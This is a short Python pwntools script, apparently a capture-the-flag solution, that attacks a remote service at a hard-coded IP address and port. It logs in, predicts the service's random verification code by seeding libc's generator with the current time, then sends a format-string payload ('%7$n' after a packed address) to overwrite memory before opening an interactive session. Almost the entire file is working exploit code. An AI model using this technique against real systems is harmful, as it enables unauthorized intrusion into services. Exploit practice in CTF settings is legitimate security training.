#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Distributed under terms of the MIT license.
# Author = nepire
#
from ctypes import*
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
#n = process('./binary')
n = remote('185.66.87.233 ',5002)
elf = ELF('./binary')
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

username = "test_account"
passwd = "test_password"
#aaaa%7$x => aaaa61616161
def regs():
    n.sendlineafter('Login: ',username)
    n.sendlineafter('Password: ',passwd)

def choice(idx):
    n.sendlineafter('> ',str(idx))

regs()
libc.srand(libc.time(0)+0xE8)
rand_num = libc.rand()
n.sendlineafter('code: ',str(rand_num))
choice(2)
n.sendlineafter('',p32(0x804c058)+'%7$n')
choice(1)

n.interactive()
